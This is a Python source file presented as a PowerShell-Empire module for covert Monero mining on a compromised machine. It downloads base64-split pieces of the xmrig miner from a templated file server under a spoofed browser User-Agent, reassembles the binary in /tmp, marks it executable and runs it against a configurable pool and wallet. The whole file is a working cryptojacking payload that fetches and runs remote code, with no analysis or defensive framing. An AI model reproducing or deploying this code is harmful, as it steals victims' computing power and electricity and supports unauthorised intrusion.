#!/usr/bin/env python3
"""PowerShell-Empire module for mining Monero

Custom downloader and executer for running a monero miner.
"""

import base64
import glob
import os
import subprocess

import requests

WORKING_DIR = '/tmp/'
EXECUTABLE = f'{WORKING_DIR}xmrig'
FILESERVER = '{{ Fileserver }}'
WALLET = '{{ Wallet }}'
ENDFILECOUNT = {{FileNumber}} + 1
MININGPOOL = '{{ MiningPool }}'

os.chdir(f'{WORKING_DIR}')


def check_for_xmrig() -> str:
    """Check for xmrig in directory"""
    xmrig_file_check = glob.glob(f'{EXECUTABLE}')
    return xmrig_file_check


def download_xmrig_binary() -> str:
    """Download xmrig from base64 files"""
    headers = {'User-Agent': 'Mozilla/5.0 (Linux x86_64; X11) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/11.0.431.99 Safari/537.13'}
    session = requests.Session()
    files_b64_string = ''
    for number_extension in range(1, int(f'{ENDFILECOUNT}')):
        file_downloader = session.get(
            f'{FILESERVER}file_{number_extension}', stream=True, headers=headers)
        files_b64_string += file_downloader.text
        del file_downloader
    session.close()
    return files_b64_string


def create_xmrig_file(files_b64_string) -> None:
    """Rebuild xmrig from base64 strings to binary file"""
    with open('xmrig', 'wb') as xmrig_content:
        xmrig_content.write(base64.b64decode(files_b64_string))
    os.chmod(f'{WORKING_DIR}xmrig', 0o755)
    return


def execute_xmrig() -> int:
    """Execute xmrig and start mining"""
    command = [f'{WORKING_DIR}xmrig', '-o', f'{MININGPOOL}', '-u',
               f'{WALLET}', '--tls', '--coin', 'monero']
    subprocess.call(command)


def main() -> None:
    """Execute the program"""
    if check_for_xmrig():
        execute_xmrig()
    else:
        files_b64_string = download_xmrig_binary()
        create_xmrig_file(files_b64_string)
        execute_xmrig()

# Comment out the if/else statement and uncomment if __name__ block when using as a standalone script.


if check_for_xmrig():
    execute_xmrig()
else:
    files_b64_string = download_xmrig_binary()
    create_xmrig_file(files_b64_string)
    execute_xmrig()


# if __name__ == '__main__':
#    main()

